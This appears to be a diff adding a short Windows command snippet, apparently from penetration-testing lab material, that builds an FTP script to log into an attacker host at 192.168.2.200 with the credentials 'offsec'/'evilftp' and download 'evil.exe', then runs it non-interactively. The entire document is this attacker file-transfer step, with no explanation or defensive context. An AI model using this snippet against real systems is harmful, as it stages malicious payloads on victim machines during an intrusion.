@@ -1,0 +1,8 @@
+echo open 192.168.2.200 21> ftp.txt
+echo offsec>> ftp.txt
+echo evilftp>> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
